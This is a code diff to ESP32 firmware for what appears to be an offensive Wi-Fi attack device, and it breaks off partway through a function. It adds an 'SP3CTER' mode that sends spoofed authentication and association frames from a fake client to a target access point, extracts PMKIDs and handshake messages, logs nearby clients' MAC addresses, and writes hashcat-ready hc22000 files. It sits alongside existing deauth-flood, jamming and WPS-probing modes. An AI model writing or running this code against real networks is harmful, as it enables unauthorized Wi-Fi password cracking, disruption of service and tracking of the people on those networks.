@@ -960,7 +960,7 @@ static void uiMemBudgetBoot();
 
 // AutoMode must be declared before handleCapturedPacket so the promiscuous
 // callback can filter on JAMMIT mode without a forward-declaration problem.
-enum class AutoMode : uint8_t { NONE, Y0INK, RAW, SCOPE, JAMMIT, PROBE_FLOOD, DEAUTH_FLOOD, PUSH1T };
+enum class AutoMode : uint8_t { NONE, Y0INK, SP3CTER, SCOPE, JAMMIT, PROBE_FLOOD, DEAUTH_FLOOD, PUSH1T };
 static AutoMode autoMode = AutoMode::NONE;
 static void engageAutoMode(AutoMode mode);
 static void disengageAutoMode();
@@ -1600,17 +1600,18 @@ static bool isBeaconFrame(const uint8_t* frame, uint32_t len) {
 
 static bool isHandshakeFrame(const uint8_t* frame, uint32_t len) {
   if (len < 32) return false;
-  // Look for EAPOL frames (0x0888 ethertype in LLC header)
-  // This is a simplified check - real implementation would parse 802.11 headers
+  // Scan for EAPOL EtherType 0x888E in the LLC/SNAP header (offset ~30 for non-QoS data frames)
   for (uint32_t i = 24; i + 1 < len; i++) {
-    if (frame[i] == 0x08 && frame[i+1] == 0x8e) {
-      return true;  // Found EAPOL
+    if (frame[i] == 0x88 && frame[i+1] == 0x8e) {
+      return true;
     }
   }
   return false;
 }
 
 static void push1tHandleBeacon(const uint8_t* frame, uint32_t len); // defined near PUSH1T engine
+static void specterHandleEapol(const uint8_t* frame, uint32_t len); // defined near SP3CTER engine
+static void specterHandleDataFrame(const uint8_t* frame, uint32_t len); // open-AP intel
 
 static void handleCapturedPacket(uint8_t *buf, uint32_t len) {
   if (!hasTarget || !sniffActive || !buf || len < 24) return;
@@ -1644,6 +1645,19 @@ static void handleCapturedPacket(uint8_t *buf, uint32_t len) {
   // PUSH1T: parse WPS IEs from beacons for the current target
   if (autoMode == AutoMode::PUSH1T && isBeaconFrame(buf, len)) {
     push1tHandleBeacon(buf, len);
+  }
+
+  // SP3CTER: full EAPOL classification, PMKID extraction, client discovery
+  if (autoMode == AutoMode::SP3CTER) {
+    if (isHandshakeFrame(buf, len)) {
+      specterHandleEapol(buf, len);
+    } else {
+      // Open-AP passive intel (data frames, client tracking)
+      const uint8_t fc0 = buf[0];
+      if (((fc0 >> 2) & 0x03) == 2) {  // data frame
+        specterHandleDataFrame(buf, len);
+      }
+    }
   }
 
   // Only write handshake and beacon frames (not all raw packets)
@@ -1890,8 +1904,8 @@ static const char* RAW_LOG_PATH = "/raw_capture.csv";
 
 static const char* autoModeStr(AutoMode m) {
   switch (m) {
-    case AutoMode::Y0INK: return "Y0INK";
-    case AutoMode::RAW:   return "RAW";
+    case AutoMode::Y0INK:   return "Y0INK";
+    case AutoMode::SP3CTER: return "SP3CTER";
     case AutoMode::SCOPE: return "SCOPE";
     case AutoMode::JAMMIT: return "JAMMIT";
     case AutoMode::PROBE_FLOOD: return "PROBE";
@@ -2200,6 +2214,7 @@ enum class ScreenId : uint8_t {
   WARDRIVE,
   SYNC,
   PUSH1T_SCREEN,
+  SP3CTER_SCREEN,
 };
 static ScreenId screen = ScreenId::HOME;
 
@@ -2230,8 +2245,9 @@ static const char* screenToStr(ScreenId s) {
     case ScreenId::PORT_SCANNER: return "PORT_SCANNER";
     case ScreenId::RECON_HOME:   return "RECON_HOME";
     case ScreenId::WARDRIVE:     return "WARDRIVE";
-    case ScreenId::SYNC:         return "SYNC";
+    case ScreenId::SYNC:          return "SYNC";
     case ScreenId::PUSH1T_SCREEN: return "PUSH1T";
+    case ScreenId::SP3CTER_SCREEN: return "SP3CTER";
     default: return "UNKNOWN";
   }
 }
@@ -2609,7 +2625,7 @@ static void handleSerialRpcLine(const String& lineRaw) {
       } else if (mode == "Y0INK") {
         engageAutoMode(AutoMode::Y0INK);
       } else if (mode == "RAW") {
-        engageAutoMode(AutoMode::RAW);
+        engageAutoMode(AutoMode::SP3CTER);
       } else if (mode == "SCOPE") {
         engageAutoMode(AutoMode::SCOPE);
       } else if (mode == "JAMMIT") {
@@ -3607,6 +3623,8 @@ static Button bruceMenuBtns[8];
 // PUSH1T screen buttons
 static Button btnP1tBack, btnP1tEngage, btnP1tManual, btnP1tBruce, btnP1tSetTarget;
 static uint32_t push1tScreenLastSig = 0;
+// SP3CTER screen buttons
+static Button btnSpBack, btnSpEngage, btnSpGhost, btnSpSetTarget, btnSpPktLab;
 static Button btnBruceSetTargetBack;
 static Button btnBruceSetTargetAll;
 static Button btnBruceSetTargetRows[8];
@@ -3800,6 +3818,56 @@ static char     push1tManufacturer[24] = "";
 static char     push1tDeviceName[24]   = "";
 static uint8_t  push1tTargetBssid[6]  = {0};
 static bool     push1tBssidCached     = false;
+
+// ── SP3CTER (Ghost PMKID + passive intel) state ────────────────────────────
+struct SpecterPmkid {
+  uint8_t staMac[6];
+  uint8_t apMac[6];
+  uint8_t pmkid[16];
+};
+static constexpr uint8_t SPECTER_PMKID_MAX = 4;
+static SpecterPmkid specterPmkids[SPECTER_PMKID_MAX];
+static uint8_t   specterPmkidCount   = 0;
+
+struct SpecterHsTrack {
+  uint8_t  staMac[6];
+  bool     m1, m2, m3, m4;
+  uint32_t lastSeenMs;
+};
+static constexpr uint8_t SPECTER_HS_MAX = 6;
+static SpecterHsTrack specterHsTracks[SPECTER_HS_MAX];
+static uint8_t   specterHsCount      = 0;
+
+static uint8_t   specterClientMacs[8][6];
+static uint8_t   specterClientCount  = 0;
+
+struct SpecterDedup { uint8_t mac[6]; uint64_t replayCtr; };
+static constexpr uint8_t SPECTER_DEDUP_MAX = 16;
+static SpecterDedup specterDedup[SPECTER_DEDUP_MAX];
+static uint8_t   specterDedupHead    = 0;
+
+static uint8_t   specterFakeStaMac[6]  = {0};
+static uint32_t  specterLastGhostMs    = 0;
+static uint32_t  specterGhostSentMs    = 0;
+static uint32_t  specterGhostCount     = 0;
+static bool      specterGhostInFlight  = false;
+static bool      specterAssocSent      = false;
+static uint32_t  specterScreenLastSig  = 0;
+
+// SP3CTER event log ring buffer (displayed on screen)
+struct SpecterLogEntry { char text[34]; uint16_t color; };
+static constexpr uint8_t SPECTER_LOG_MAX = 8;
+static SpecterLogEntry specterEventLog[SPECTER_LOG_MAX];
+static uint8_t specterLogHead  = 0;
+static uint8_t specterLogCount = 0;
+
+static void specterLogAdd(const char* msg, uint16_t col = 0xFFFF) {
+  strncpy(specterEventLog[specterLogHead].text, msg, 33);
+  specterEventLog[specterLogHead].text[33] = '\0';
+  specterEventLog[specterLogHead].color = col;
+  specterLogHead  = (specterLogHead  + 1) % SPECTER_LOG_MAX;
+  if (specterLogCount < SPECTER_LOG_MAX) specterLogCount++;
+}
 
 // Just Go adaptive feedback state
 static bool justGoY0inkExtendedOnce = false;
@@ -4095,6 +4163,13 @@ static void tdisplayNavBuild() {
       tdisplayNavPush(btnP1tManual);
       tdisplayNavPush(btnP1tSetTarget);
       tdisplayNavPush(btnP1tBruce);
+      break;
+    case ScreenId::SP3CTER_SCREEN:
+      tdisplayNavPush(btnSpBack);
+      tdisplayNavPush(btnSpEngage);
+      tdisplayNavPush(btnSpGhost);
+      tdisplayNavPush(btnSpSetTarget);
+      tdisplayNavPush(btnSpPktLab);
       break;
     case ScreenId::BRUCE_MENU:
       for (int i = 0; i < 8; i++) tdisplayNavPush(bruceMenuBtns[i]);
@@ -4827,12 +4902,12 @@ static void drawAutomateMenu() {
   const int bh = clampi((maxGridH - gapY) / 2, 34, 46);
 
   btnAutoY0INK  = {pad,          top,              bw, bh, "Y0INK"};
-  btnAutoRAW    = {pad + bw + gapX, top,           bw, bh, "RAW"};
+  btnAutoRAW    = {pad + bw + gapX, top,           bw, bh, "SP3CTER"};
   btnAutoSCOPE  = {pad,          top + bh + gapY,  bw, bh, "SCOPE"};
   btnAutoJAMMIT = {pad + bw + gapX, top + bh + gapY, bw, bh, "JAMMIT"};
 
   drawButton(btnAutoY0INK,  autoMode == AutoMode::Y0INK  ? TFT_DARKGREEN : TFT_DARKCYAN,  TFT_MAGENTA, TFT_WHITE);
-  drawButton(btnAutoRAW,    autoMode == AutoMode::RAW    ? TFT_DARKGREEN : TFT_NAVY,      TFT_CYAN,    TFT_WHITE);
+  drawButton(btnAutoRAW,    autoMode == AutoMode::SP3CTER    ? TFT_DARKGREEN : TFT_NAVY,      TFT_CYAN,    TFT_WHITE);
   drawButton(btnAutoSCOPE,  autoMode == AutoMode::SCOPE  ? TFT_DARKGREEN : TFT_MAROON,    TFT_CYAN,    TFT_WHITE);
   drawButton(btnAutoJAMMIT, autoMode == AutoMode::JAMMIT ? TFT_DARKGREEN : TFT_DARKGREY,  TFT_MAGENTA, TFT_WHITE);
 
@@ -5033,7 +5108,7 @@ static uint32_t justGoModeDurationMs(AutoMode mode) {
     case AutoMode::PROBE_FLOOD:  return 30000U;
     case AutoMode::Y0INK:        return 90000U;
     case AutoMode::JAMMIT:       return 45000U;
-    case AutoMode::RAW:          return 45000U;
+    case AutoMode::SP3CTER:          return 45000U;
     case AutoMode::DEAUTH_FLOOD: return 45000U;
     case AutoMode::PUSH1T:       return 45000U;
     default: return 25000U;
@@ -5084,7 +5159,7 @@ static AutoMode justGoModeForStep(const ApRecord& a, uint8_t step) {
   if (justGoSprayPray) {
     if (step == 0) return AutoMode::Y0INK;
     if (step == 1) return AutoMode::JAMMIT;
-    return AutoMode::RAW;
+    return AutoMode::SP3CTER;
   }
   
   // Profile-specific mode sequences
@@ -5099,31 +5174,31 @@ static AutoMode justGoModeForStep(const ApRecord& a, uint8_t step) {
       if (step == 0) return AutoMode::PROBE_FLOOD;
       if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) {
         // For open: PROBE + RAW
-        if (step == 1) return AutoMode::RAW;
+        if (step == 1) return AutoMode::SP3CTER;
       } else {
         // For WPA/WPA2: PROBE + Y0INK + JAMMIT + RAW
         if (step == 1) return AutoMode::Y0INK;
         if (step == 2) return AutoMode::JAMMIT;
-        if (step == 3) return AutoMode::RAW;
+        if (step == 3) return AutoMode::SP3CTER;
       }
       return AutoMode::NONE;
     
     case JustGoProfile::CHAOS:
       // CHAOS: Broadcast deauth flood + passive sniff
       if (step == 0) return AutoMode::DEAUTH_FLOOD;
-      if (step == 1) return AutoMode::RAW;
+      if (step == 1) return AutoMode::SP3CTER;
       return AutoMode::NONE;
     
     default: // STANDARD
       if (a.auth == WIFI_AUTH_OPEN || a.auth == WIFI_AUTH_WEP) {
-        if (step == 0) return AutoMode::RAW;
+        if (step == 0) return AutoMode::SP3CTER;
       } else {
         // WPA/WPA2/WPA3: Y0INK → PUSH1T → JAMMIT → Y0INK_RETRY → RAW
         if (step == 0) return AutoMode::Y0INK;
         if (step == 1) return AutoMode::PUSH1T; // WPS assessment
         if (step == 2) return AutoMode::JAMMIT;
         if (step == 3) return AutoMode::Y0INK;  // post-JAMMIT retry window
-        if (step == 4) return AutoMode::RAW;
+        if (step == 4) return AutoMode::SP3CTER;
       }
       return AutoMode::NONE;
   }
@@ -5271,7 +5346,7 @@ static void justGoUpdateConsole() {
         modeDesc = "WPS probe & assessment...";
       } else if (justGoMode == AutoMode::JAMMIT) {
         modeDesc = "Launching deauth attack...";
-      } else if (justGoMode == AutoMode::RAW) {
+      } else if (justGoMode == AutoMode::SP3CTER) {
         modeDesc = "Passive packet capture...";
       } else if (justGoMode == AutoMode::PROBE_FLOOD) {
         modeDesc = "Waking clients with probes...";
@@ -5372,7 +5447,7 @@ static void justGoTick() {
           modeDesc = "WPS probe & assessment...";
         else if (justGoMode == AutoMode::JAMMIT)
           modeDesc = "Launching deauth stimulus...";
-        else if (justGoMode == AutoMode::RAW)
+        else if (justGoMode == AutoMode::SP3CTER)
           modeDesc = "Passive packet capture...";
         else if (justGoMode == AutoMode::PROBE_FLOOD)
           modeDesc = "Waking clients with probes...";
@@ -5442,12 +5517,30 @@ static void justGoTick() {
           // Mark so next Y0INK uses shorter post-stimulus window
           justGoPostStimulusWindow = true;
           Serial.printf("[JUSTGO-ADAPT] jammit_done post_stimulus_window=1\n");
-        } else if (justGoMode == AutoMode::RAW) {
-          justGoLogf("RAW complete - sniff done");
-          Serial.printf("[JUSTGO-RESULT] succeeded=%d hs=%u pmkid=%u\n",
-                        justGoTargetSucceeded ? 1 : 0,
-                        YoinkEngine::isRunning() ? YoinkEngine::getHandshakeCount() : 0,
-                        YoinkEngine::isRunning() ? YoinkEngine::getPmkidCount()    : 0);
+        } else if (justGoMode == AutoMode::SP3CTER) {
+          // SP3CTER success: PMKID captured or HS complete
+          const bool spSuccess = (specterPmkidCount > 0);
+          const bool spPartial = !spSuccess && (specterHsCount > 0);
+          if (spSuccess) {
+            justGoTargetSucceeded = true;
+            justGoTargetHadPartial = true;
+            justGoRecordTargetSuccess(target);
+            justGoRecordModeOutcome(AutoMode::SP3CTER, true);
+            justGoLogf("SP3CTER: %u PMKID", (unsigned)specterPmkidCount);
+          } else if (spPartial) {
+            justGoTargetHadPartial = true;
+            justGoRecordModeOutcome(AutoMode::SP3CTER, false);
+            justGoLogf("SP3CTER: partial HS %u", (unsigned)specterHsCount);
+          } else {
+            justGoRecordModeOutcome(AutoMode::SP3CTER, false);
+            justGoLogf("SP3CTER: no capture");
+          }
+          Serial.printf("[SP3CTER-RESULT] succeeded=%d pmkid=%u hs=%u clients=%u ghosts=%lu\n",
+                        spSuccess ? 1 : 0,
+                        (unsigned)specterPmkidCount,
+                        (unsigned)specterHsCount,
+                        (unsigned)specterClientCount,
+                        (unsigned long)specterGhostCount);
         } else if (justGoMode == AutoMode::PUSH1T) {
           if (push1tWpsDetected) {
             justGoLogf("WPS:%s%s v%02X",
@@ -5558,7 +5651,7 @@ static void drawJustGo() {
   // Pipeline row: SCN | LCK | Y0NK | P1T | JAM | RAW | HOP
   const int pipeY = y0 + statusH + 4;
   const int pipeH = 16;
-  const char* pLabels[7] = {"SCN", "LCK", "Y0NK", "P1T", "JAM", "RAW", "HOP"};
+  const char* pLabels[7] = {"SCN", "LCK", "Y0NK", "P1T", "JAM", "SPX", "HOP"};
   const int pipeW = (leftW - 10) / 7;
   for (int i = 0; i < 7; ++i) {
     const int bx = leftX + 2 + (i * pipeW);
@@ -5568,14 +5661,14 @@ static void drawJustGo() {
     if (i == 2 && (justGoMode == AutoMode::Y0INK || justGoLastMode == AutoMode::Y0INK)) col = TFT_GREEN;
     if (i == 3 && (justGoMode == AutoMode::PUSH1T || justGoLastMode == AutoMode::PUSH1T)) col = push1tVulnerable ? TFT_RED : TFT_MAGENTA;
     if (i == 4 && (justGoMode == AutoMode::JAMMIT || justGoLastMode == AutoMode::JAMMIT)) col = TFT_GREEN;
-    if (i == 5 && (justGoMode == AutoMode::RAW || justGoLastMode == AutoMode::RAW)) col = TFT_GREEN;
+    if (i == 5 && (justGoMode == AutoMode::SP3CTER || justGoLastMode == AutoMode::SP3CTER)) col = TFT_GREEN;
     if (i == 6 && (justGoStage == JustGoStage::COOLDOWN || justGoLastStage == JustGoStage::COOLDOWN)) col = TFT_CYAN;
     if ((i == 0 && justGoStage == JustGoStage::SCAN) ||
         (i == 1 && justGoStage == JustGoStage::SELECT_TARGET) ||
         (i == 2 && justGoMode == AutoMode::Y0INK) ||
         (i == 3 && justGoMode == AutoMode::PUSH1T) ||
         (i == 4 && justGoMode == AutoMode::JAMMIT) ||
-        (i == 5 && justGoMode == AutoMode::RAW) ||
+        (i == 5 && justGoMode == AutoMode::SP3CTER) ||
         (i == 6 && justGoStage == JustGoStage::COOLDOWN)) {
       col = TFT_YELLOW;
     }
@@ -5646,9 +5739,9 @@ static void drawJustGo() {
   else if (justGoStage == JustGoStage::COOLDOWN) nextAct = "HOP";
   else if (justGoMode == AutoMode::Y0INK  && !justGoPostStimulusWindow)
     nextAct = justGoTargetHadClient ? "STIMULUS" : "LISTEN";
-  else if (justGoMode == AutoMode::Y0INK  && justGoPostStimulusWindow)  nextAct = "RAW";
+  else if (justGoMode == AutoMode::Y0INK  && justGoPostStimulusWindow)  nextAct = "SP3CTER";
   else if (justGoMode == AutoMode::JAMMIT)                              nextAct = "RETRY";
-  else if (justGoMode == AutoMode::RAW)                                 nextAct = "HOP";
+  else if (justGoMode == AutoMode::SP3CTER)                             nextAct = "HOP";
   else if (justGoTargetSucceeded)                                       nextAct = "RAW";
 
   char s1[22], s2[22], s3[22], s4[22], s5[22], s6[22], s7[22], s8[22], s9[22];
@@ -5747,6 +5840,9 @@ static void drawJustGo() {
   mix((uint32_t)justGoSessionAttempts);
   mix((uint32_t)push1tWpsDetected);
   mix((uint32_t)push1tVulnerable);
+  mix((uint32_t)specterPmkidCount);
+  mix((uint32_t)specterHsCount);
+  mix((uint32_t)(specterGhostCount & 0xFF));
   justGoLastRenderSig = sig;
 
   drawBorder();
@@ -6199,9 +6295,335 @@ static void push1tTick() {
   }
 }
 
+// ============================================================
+//  SP3CTER engine — Ghost PMKID elicitation + passive EAPOL intel
+// ============================================================
+
+// ── Helpers ───────────────────────────────────────────────────────────────
+
+// Locate the EAPOL start offset within a raw 802.11 frame.
+// Returns 0 if not found. EAPOL data byte 0 is at the returned offset.
+static uint32_t specterFindEapolOffset(const uint8_t* frame, uint32_t len) {
+  for (uint32_t i = 24; i + 1 < len; i++) {
+    if (frame[i] == 0x88 && frame[i+1] == 0x8e) return i + 2;
+  }
+  return 0;
+}
+
+// Classify an EAPOL-Key frame. Returns 1=M1,2=M2,3=M3,4=M4,0=not EAPOL-Key.
+static uint8_t specterClassifyEapol(const uint8_t* frame, uint32_t len) {
+  const uint32_t eapol = specterFindEapolOffset(frame, len);
+  if (!eapol || eapol + 4 > len) return 0;
+  if (frame[eapol + 1] != 0x03) return 0;  // not EAPOL-Key
+  const uint32_t key = eapol + 4;
+  if (key + 95 > len) return 0;
+  if (frame[key] != 0x02) return 0;          // not RSN descriptor
+  const uint16_t ki = ((uint16_t)frame[key+1] << 8) | frame[key+2];
+  const bool ack     = (ki & 0x0080) != 0;
+  const bool mic     = (ki & 0x0100) != 0;
+  const bool secure  = (ki & 0x0200) != 0;
+  const bool install = (ki & 0x0040) != 0;
+  if (ack  && !mic)              return 1; // M1
+  if (!ack &&  mic && !secure)   return 2; // M2
+  if (ack  &&  mic &&  install)  return 3; // M3
+  if (!ack &&  mic &&  secure)   return 4; // M4
+  return 0;
+}
+
+// Check replay-counter dedup. Returns true if this is a retransmission.
+static bool specterIsDuplicate(const uint8_t* frame, uint32_t len) {
+  const uint32_t eapol = specterFindEapolOffset(frame, len);
+  if (!eapol) return false;
+  const uint32_t key = eapol + 4;
+  if (key + 13 > len) return false;
+  // Addr2 (SA) is at buf+10 (ToDS frame: STA) or buf+4 (FromDS: handled by searching dedup by rc)
+  const uint8_t* sa = frame + 10;
+  // replay counter at key+5 (8 bytes)
+  uint64_t rc = 0;
+  for (int i = 0; i < 8; i++) rc = (rc << 8) | frame[key + 5 + i];
+  for (uint8_t i = 0; i < SPECTER_DEDUP_MAX; i++) {
+    if (memcmp(specterDedup[i].mac, sa, 6) == 0 && specterDedup[i].replayCtr == rc) return true;
+  }
+  memcpy(specterDedup[specterDedupHead].mac, sa, 6);
+  specterDedup[specterDedupHead].replayCtr = rc;
+  specterDedupHead = (specterDedupHead + 1) % SPECTER_DEDUP_MAX;
+  return false;
+}
+
+// Extract 16-byte PMKID from EAPOL M1 Key Data KDEs. Returns true on success.
+static bool specterExtractPmkid(const uint8_t* frame, uint32_t len, uint8_t* pmkidOut) {
+  if (specterClassifyEapol(frame, len) != 1) return false;
+  const uint32_t eapol = specterFindEapolOffset(frame, len);
+  if (!eapol) return false;
+  const uint32_t key = eapol + 4;
+  if (key + 95 > len) return false;
+  const uint16_t dataLen = ((uint16_t)frame[key+93] << 8) | frame[key+94];
+  if (dataLen == 0) return false;
+  const uint32_t dataStart = key + 95;
+  if (dataStart + dataLen > len) return false;
+  // Walk KDEs looking for PMKID: DD 14 00 0F AC 04 [16 bytes]
+  uint32_t i = dataStart;
+  while (i + 6 <= dataStart + dataLen) {
+    if (frame[i] != 0xDD) break;
+    const uint8_t klen = frame[i+1];
+    if (i + 2 + klen > dataStart + dataLen) break;
+    if (klen >= 20 && frame[i+2]==0x00 && frame[i+3]==0x0F && frame[i+4]==0xAC && frame[i+5]==0x04) {
+      memcpy(pmkidOut, frame + i + 6, 16);
+      return true;
+    }
+    i += 2 + klen;
+  }
+  return false;
+}
+
+// Find or LRU-create a HS track entry for a given STA MAC.
+static SpecterHsTrack* specterFindOrCreateHsTrack(const uint8_t* staMac) {
+  // Find existing
+  for (uint8_t i = 0; i < specterHsCount; i++)
+    if (memcmp(specterHsTracks[i].staMac, staMac, 6) == 0) return &specterHsTracks[i];
+  // Allocate or evict oldest
+  uint8_t slot = (specterHsCount < SPECTER_HS_MAX) ? specterHsCount++ : 0;
+  if (specterHsCount == SPECTER_HS_MAX) {
+    uint32_t oldest = specterHsTracks[0].lastSeenMs;
+    for (uint8_t i = 1; i < SPECTER_HS_MAX; i++)
+      if (specterHsTracks[i].lastSeenMs < oldest) { oldest = specterHsTracks[i].lastSeenMs; slot = i; }
+  }
+  memcpy(specterHsTracks[slot].staMac, staMac, 6);
+  specterHsTracks[slot] = {0};
+  memcpy(specterHsTracks[slot].staMac, staMac, 6);
+  return &specterHsTracks[slot];
+}
+
+// Track a passive client MAC (data frame STA).
+static void specterAddClient(const uint8_t* mac) {
+  if ((mac[0] & 0x01) != 0) return; // skip multicast
+  for (uint8_t i = 0; i < specterClientCount; i++)
+    if (memcmp(specterClientMacs[i], mac, 6) == 0) return;
+  // Log new client discovery (yellow, only first 8 to avoid spam)
+  if (specterClientCount < 8) {
+    char logbuf[34];
+    snprintf(logbuf, sizeof(logbuf), "? Client %02x:%02x:%02x",
+             mac[3], mac[4], mac[5]);
+    specterLogAdd(logbuf, 0xFFE0);  // yellow
+  }
+  if (specterClientCount < 8) memcpy(specterClientMacs[specterClientCount++], mac, 6);
+}
+
+// Write all collected PMKIDs to hashcat hc22000 format on SD.
+static void specterWriteHc22000() {
+  if (!sdReady || specterPmkidCount == 0 || captureDir[0] == '\0') return;
+  char path[160];
+  snprintf(path, sizeof(path), "%s/specter.hc22000", captureDir);
+  File f = SD.open(path, FILE_WRITE);
+  if (!f) return;
+  for (uint8_t i = 0; i < specterPmkidCount; i++) {
+    const SpecterPmkid& p = specterPmkids[i];
+    // PMKID hex
+    for (int b = 0; b < 16; b++) { char h[3]; snprintf(h,3,"%02x",p.pmkid[b]); f.print(h); }
+    f.print("*");
+    for (int b = 0; b < 6;  b++) { char h[3]; snprintf(h,3,"%02x",p.apMac[b]);  f.print(h); }
+    f.print("*");
+    for (int b = 0; b < 6;  b++) { char h[3]; snprintf(h,3,"%02x",p.staMac[b]); f.print(h); }
+    f.print("*");
+    // SSID as hex
+    for (size_t b = 0; b < target.ssid.length(); b++) {
+      char h[3]; snprintf(h, 3, "%02x", (uint8_t)target.ssid[b]); f.print(h);
+    }
+    f.println();
+  }
+  f.close();
+  Serial.printf("[SP3CTER] wrote %d PMKID(s) to %s\n", specterPmkidCount, path);
+}
+
+// ── EAPOL handler (called from handleCapturedPacket when SP3CTER active) ──
+
+static void specterHandleEapol(const uint8_t* frame, uint32_t len) {
+  if (specterIsDuplicate(frame, len)) return;
+  const uint8_t msg = specterClassifyEapol(frame, len);
+  if (msg == 0) return;
+
+  // Determine STA MAC: FC byte 1 ToDS/FromDS bits
+  const uint8_t fc1 = frame[1];
+  const bool toDS   = (fc1 & 0x01) != 0;
+  const bool fromDS = (fc1 & 0x02) != 0;
+  const uint8_t* apMac  = fromDS ? (frame + 10) : (frame + 4);
+  const uint8_t* staMac = fromDS ? (frame + 4)  : (frame + 10);
+
+  // Update HS tracking
+  SpecterHsTrack* t = specterFindOrCreateHsTrack(staMac);
+  t->lastSeenMs = millis();
+  if (msg == 1) t->m1 = true;
+  else if (msg == 2) t->m2 = true;
+  else if (msg == 3) t->m3 = true;
+  else if (msg == 4) t->m4 = true;
+
+  // Log EAPOL message (cyan for M1/M3 from AP, white for M2/M4 from STA)
+  {
+    char logbuf[34];
+    const char* mname = msg==1?"M1":msg==2?"M2":msg==3?"M3":"M4";
+    snprintf(logbuf, sizeof(logbuf), "%s %02x:%02x:%02x",
+             mname, staMac[3], staMac[4], staMac[5]);
+    specterLogAdd(logbuf, (msg==1||msg==3) ? 0x07FF : 0xFFFF);  // cyan/white
+  }
+
+  // On M1: attempt PMKID extraction
+  if (msg == 1 && specterPmkidCount < SPECTER_PMKID_MAX) {
+    uint8_t pmkid[16];
+    if (specterExtractPmkid(frame, len, pmkid)) {
+      // Deduplicate by PMKID value
+      bool dup = false;
+      for (uint8_t i = 0; i < specterPmkidCount; i++)
+        if (memcmp(specterPmkids[i].pmkid, pmkid, 16) == 0) { dup = true; break; }
+      if (!dup) {
+        SpecterPmkid& p = specterPmkids[specterPmkidCount++];
+        memcpy(p.pmkid, pmkid, 16);
+        memcpy(p.apMac,  apMac,  6);
+        memcpy(p.staMac, staMac, 6);
+        specterWriteHc22000();
+        char logbuf[34];
+        snprintf(logbuf, sizeof(logbuf), "! PMKID #%u CAPTURED", specterPmkidCount);
+        specterLogAdd(logbuf, 0x07E0);  // green
+        Serial.printf("[SP3CTER] PMKID #%d captured! %02x%02x%02x%02x...\n",
+                      specterPmkidCount, pmkid[0],pmkid[1],pmkid[2],pmkid[3]);
+      }
+    }
+    // If no PMKID KDE, the M1 still starts a 4-way — track it
+    specterAddClient(staMac);
+  }
+  if (msg == 2) specterAddClient(staMac);
+}
+
+// ── Open-AP data frame handler ─────────────────────────────────────────────
+
+static void specterHandleDataFrame(const uint8_t* frame, uint32_t len) {
+  if (len < 26) return;
+  // Extract STA MAC from ToDS frames (STA→AP: Addr2=STA)
+  const uint8_t fc1 = frame[1];
+  if ((fc1 & 0x01) != 0) specterAddClient(frame + 10); // ToDS: Addr2=STA
+  else if ((fc1 & 0x02) != 0) specterAddClient(frame + 4); // FromDS: Addr1=STA
+}
+
+// ── Ghost PMKID frame transmitter ─────────────────────────────────────────
+
+static void specterRandomizeSta() {
+  // Locally administered, unicast MAC
+  specterFakeStaMac[0] = 0x02;
+  specterFakeStaMac[1] = (uint8_t)(esp_random() & 0xFF);
+  specterFakeStaMac[2] = (uint8_t)(esp_random() & 0xFF);
+  specterFakeStaMac[3] = (uint8_t)(esp_random() & 0xFF);
+  specterFakeStaMac[4] = (uint8_t)(esp_random() & 0xFF);
+  specterFakeStaMac[5] = (uint8_t)(esp_random() & 0xFF);
+}
+
+static void specterSendGhostAuth() {
+  if (!hasTarget) return;
+  uint8_t bssid[6];
+  if (!macFromString(target.bssid.c_str(), bssid)) return;
+
+  // 802.11 Authentication Request (Open System, seq 1)
+  uint8_t auth[30] = {
+    0xB0, 0x00,              // FC: mgmt, subtype=11 (auth)
+    0x3A, 0x01,              // duration
+    0,0,0,0,0,0,             // Addr1: AP BSSID
+    0,0,0,0,0,0,             // Addr2: fake STA
+    0,0,0,0,0,0,             // Addr3: AP BSSID
+    0x10, 0x00,              // seq
+    0x00, 0x00,              // auth algorithm: open system
+    0x01, 0x00,              // auth seq: 1
+    0x00, 0x00               // status: success
+  };
+  memcpy(auth + 4,  bssid,             6);
+  memcpy(auth + 10, specterFakeStaMac, 6);
+  memcpy(auth + 16, bssid,             6);
+  esp_wifi_80211_tx(WIFI_IF_AP, auth, sizeof(auth), false);
+  // Log ghost event (magenta)
+  char ghostlog[34];
+  snprintf(ghostlog, sizeof(ghostlog), "> Ghost #%lu auth sent", (unsigned long)(specterGhostCount+1));
+  specterLogAdd(ghostlog, 0xF81F);  // magenta
+}
+
+static void specterSendGhostAssoc() {
+  if (!hasTarget) return;
+  uint8_t bssid[6];
+  if (!macFromString(target.bssid.c_str(), bssid)) return;
+
+  const char* ssid = target.ssid.c_str();
+  const uint8_t ssidLen = (uint8_t)min((int)strlen(ssid), 32);
+
+  // RSN IE for WPA2-CCMP-PSK (no PMKID list — let AP generate one)
+  static const uint8_t rsnIe[] = {
+    0x30, 0x14,               // ID=RSN, len=20
+    0x01, 0x00,               // version
+    0x00, 0x0F, 0xAC, 0x04,  // group cipher: CCMP
+    0x01, 0x00,               // pairwise count: 1
+    0x00, 0x0F, 0xAC, 0x04,  // pairwise: CCMP
+    0x01, 0x00,               // AKM count: 1
+    0x00, 0x0F, 0xAC, 0x02,  // AKM: PSK
+    0x00, 0x00                // RSN capabilities
+  };
+  static const uint8_t rates[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C
+  };
+
+  const uint16_t bodyLen = 4 + (2 + ssidLen) + sizeof(rates) + sizeof(rsnIe);
+  const uint16_t frameLen = 24 + bodyLen;
+  if (frameLen > 256) return;
+
+  uint8_t frame[256] = {};
+  // 802.11 header
+  frame[0] = 0x00; frame[1] = 0x00;   // FC: mgmt assoc req
+  frame[2] = 0x3A; frame[3] = 0x01;   // duration
+  memcpy(frame + 4,  bssid,             6);  // Addr1
+  memcpy(frame + 10, specterFakeStaMac, 6);  // Addr2
+  memcpy(frame + 16, bssid,             6);  // Addr3
+  frame[22] = 0x20; frame[23] = 0x00;        // seq
+  // Capability info, listen interval
+  frame[24] = 0x31; frame[25] = 0x04;
+  frame[26] = 0x0A; frame[27] = 0x00;
+  // SSID IE
+  uint16_t pos = 28;
+  frame[pos++] = 0x00; frame[pos++] = ssidLen;
+  memcpy(frame + pos, ssid, ssidLen); pos += ssidLen;
+  // Supported rates
+  memcpy(frame + pos, rates, sizeof(rates)); pos += sizeof(rates);
+  // RSN IE
+  memcpy(frame + pos, rsnIe, sizeof(rsnIe)); pos += sizeof(rsnIe);
+
+  esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
+}
+
+// ── Main tick (called from loop()) ─────────────────────────────────────────
+
+static void specterTick() {
+  if (autoMode != AutoMode::SP3CTER) return;
